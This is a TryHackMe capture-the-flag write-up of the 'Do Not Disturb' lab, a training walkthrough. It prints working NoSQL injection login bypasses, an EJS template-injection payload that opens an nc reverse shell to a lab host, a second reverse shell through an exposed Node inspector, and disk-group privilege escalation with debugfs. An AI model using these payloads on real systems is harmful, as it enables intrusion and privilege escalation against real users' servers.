<p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# Do Not Disturb

| Room Name | Do Not Disturb |
|-----------|----------------|
| Platform | TryHackMe |
| Event | Hacker Holidays 2026 |
| Points | 90 |
| Category | 🐚 Boot2Root |
| Difficulty | Medium |
| Tags | Web Exploitation, Session Hijacking, Linux Privilege Escalation |
| Status | ✅ Completed |

## Room Information

```
Type: CTF Challenge  
Difficulty: Medium  
Category: Web Exploitation / Privilege Escalation

Description:
Sign's on the door. Room's active. You have access you were never given, and so does he.
```

## Challenge Overview

**Hacker Holidays: Day 7 — Do Not Disturb**

Someone has already compromised the Byte Lotus Hotel's poolside platform and is moving throughout the environment using stolen sessions and elevated privileges. The goal is to follow the attacker's trail, gain access to the target system, escalate privileges, and recover both the user and root flags.

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/67fa3f37-95b5-41dd-8e4f-9966fd37b704" />
</p>

## Objectives

- Find the user flag
- Find the root flag

## Solution

- First thing I did was use Gobuster to find any hidden directories, files, or api endpoints. I had found two listed below
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/cc302938-50e7-41a8-9d05-22c292939cb0" />
</p>

- I went to the `/staff` page and we can see it was forbidden and so I need a way to get to this admin page as if I were a staff
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/e535d72e-49fa-4619-80d4-0d4c968db5d2" />
</p>

- I tried putting in dummy username and password which did not work but I explored around by opening the developer tools and I noticed that when I went to `Storage` and checked `Cookies`, there was no data present

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/eb5027a8-2fe7-40c8-9ac0-cd1eb8eb64f8" />
</p>

- I used Burp Suite to take a deeper look. Below, you can see the logon with the username and password I made. I needed a way to bypass this logon
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/55e5e169-3421-4b93-a97c-796db1f0777d" />
</p>

- I tried doing SQL injection attacks but those did not work
```
username=attendant' OR '1'='1&password=123
```
```
username=attendant'--&password=123
```
```
username=attendant' OR 1=1--&password=123
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/1c7bc7c5-5904-4c87-903d-4b4152ac1049" />
</p>

- However, we notice here this application is built using Node.js (Express) and probably uses NoSQL databases and this is useful because different databases have different weaknesses
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/5175dfc9-6042-4630-acaa-493d912e4cee" />
</p>

- Since this is an Express app, it very likely uses MongoDB or NeDB on the backend instead of standard SQL. If it takes JSON inputs or handles objects poorly, we can bypass authentication using NoSQL injection
```
{
	"username": "attendant",
	"password": {"$ne": "invalid_password_here"}
}
```
- Instead of sending in a normal username and password, we send in a object where `"$ne"` means not equal in databases such as MongoDB. Basically, we are trying to find a user whose password is not equal to `"invalid_password_here"` and since every real password is not equal to `"invalid_password_here"`, the condition could be true for almost every user. Below, I successfully executed a NoSQL injection attack and got the cookie

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/9fe85ba1-45db-4afb-93b0-fdf218f8f5c1" />
</p>

- I went back to the developer's tool and inputted that exact cookie's information
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/202dae7b-dab7-45a0-8f99-85b205f1e4d6" />
</p>

- BOOM!, we made it to the staff admin page. I had successfully executed session hijacking
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/8cf70105-c1e3-4c62-8661-5c8e33f26843" />
</p>

- Now, I noticed that backend uses something called an EJS (Embedded JavaScript templates) to render this message. Since we can modify the template text and hit `Preview`, this could be a setup for Server-Side Template Injection (SSTI), which will allow us to execute code on the server and get a reverse shell. I tested that with the classic payload and it returned `49` confirming this application is vulnerable to SSTI
```
<%= 7 * 7 %>
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/8cfb7799-835f-4e0e-a6d9-83dbbf6e1ee2" />
</p>

- I started a Netcat listener to catch a incoming reverse shell
```
nc -lvnp 4444
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/3cadf8c9-d0c1-481f-b6b9-305f3d9abccd" />
</p>

- I used the following payload for exploitation

```
<%= global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.67.110.19 4444 >/tmp/f').toString() %>
```

- This payload takes advantage of the SSTI vulnerability to execute JavaScript on the server. It uses Node.js's `child_process` module to run an operating system command, which opens a reverse shell and gives me remote command execution on the target

- I submitted the execution payload to trigger the connection
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/c2b311e7-77e6-48dc-81c5-e9b870aa7e7b" />
</p>

- I ended up getting a shell and we are officially in
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2ede59f3-9b76-42fc-96d5-c9c2753e5606" />
</p>

- I upgraded the terminal environment first and then I ran `whoami` to confirm we are the user `poolside`
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/fb5c39a7-047f-4066-95f0-8bd835169f20" />
</p>

- I then located and retrieved the user flag
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/093e4b4a-b3b1-486a-a19f-ab9aeed12120" />
</p>

- Now, we needed the root flag and for that I tried looking at services running only on the machine itself, especially if they're running as different (more privileged) users like root. This matters because some services only listen on localhost meaning only someone already logged into the machine can access them and these might have administrative functions, databases, web dashboards, or APIs that may be misconfigured
```
ss -tlnp
```

- This hidden port stood out to me
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/5306454e-0272-4561-b00a-ba2c9a8eff01" />
</p>

- I then checked for current running processes
```
ps aux | grep -v "\["
```
- We can see a separate internal user (`pipelin+`) is running a Node.js script called `processor.js` with the `--inspect=127.0.0.1:9229 flag` enabled. This flag is important because it opens the Node.js V8 Debugger Protocol. Because it is open internally, anyone local on the box can connect to this port and use the debugger to execute JavaScript code inside that active backend process. If the pipeline service has higher privileges it can can lead us to root

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/0ec8dde4-0f6e-44ae-8de0-1548ba3d909d" />
</p>

- Now, we can connect straight to the running process locally. I opened up a second Netcat listener
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/caf46f6b-d4c4-4422-a2d9-0741c818c6ca" />
</p>

- I ran the built-in Node debugger client to connect to the open port and then I typed `repl` to open an interactive evaluation session
```
node inspect 127.0.0.1:9229
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2898c38f-a521-4a7a-8679-c9c823d9ccd4" />
</p>

- I then typed the command below to get another reverse shell. We have successfully hopped horizontally into the second user profile
```
process.getBuiltinModule('child_process').execSync('rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i 2>&1|nc 10.67.110.99 5555 >/tmp/f2')
```
- I ran `python3 -c 'import pty; pty.spawn("/bin/bash")'` to upgrade the terminal
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/b8e40b34-863a-4a21-be60-b48cc2396336" />
</p>

- Now that I was logged in as the pipeline service user, I still needed administrative control to get the final flag. I ran `id` and it outputted `groups=995(pipelinesvc),6(disk)` which meant the account belonged to the Linux disk group. This is important because in Linux, the disk group is very powerful. It gives a user raw hardware read/write privileges over the physical hard drive blocks themselves. This means we don't have to obey traditional file permissions or use `sudo` and instead we can read straight from the hardware level

- ⚠️ Note: I had to restart the Attackbox so I the IP address of the Attackbox changed from `10.67.110.99` to `10.66.73.105` but all the steps and logic remain the same

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/a8772ee1-2f77-40d8-a4ed-5a073f2b27e6" />
</p>

- I ran `lsblk` to find the exact hardware device name where the operating system's main directory was stored on the disk and it showed the main storage partition block was called `/dev/nvme0n1p1`. The `/` mount point is the root filesystem which is the top of the entire Linux directory tree. Since `/root/root.txt` lives under `/`, it must be stored on the partition mounted as `/`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/9998c017-4986-4d44-a92c-f66da27e5b8b" />
</p>

- Because we are in the disk group, we can pass this hard drive block straight into a built-in file debugger utility called `debugfs`. This lets us bypass all access controls and pull files right off the disk structure and I ended up retrieving the flag
```
debugfs /dev/nvme0n1p1
```
```
debugfs:  cat /root/root.txt
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/a6337751-e272-4661-867a-0bd3b108fb31" />
</p>

## Skills Learned

* Web content enumeration with Gobuster
* Identifying Node.js/Express applications through HTTP fingerprinting
* Exploiting NoSQL injection to bypass authentication
* Session hijacking using authenticated session cookies
* Identifying and exploiting EJS Server-Side Template Injection (SSTI)
* Gaining Remote Code Execution (RCE) via Node.js `child_process`
* Establishing and upgrading reverse shells
* Enumerating local services and processes for privilege escalation
* Exploiting an exposed Node.js Inspector (`--inspect`) to execute code in a privileged process
* Horizontal privilege escalation through process impersonation
* Enumerating Linux users, groups, and permissions
* Exploiting membership in the `disk` group to bypass filesystem permissions
* Reading protected files directly from a disk partition using `debugfs`

## Tools Used

* Gobuster
* Burp Suite
* Firefox Developer Tools
* Netcat (`nc`)
* Python (`pty.spawn`)
* Node.js Inspector (`node inspect`)
* `ss`
* `ps`
* `id`
* `lsblk`
* `debugfs`

## Flags

🚩 User Flag: `THM{*******************}`

🚩 Root Flag: `THM{***********************}`
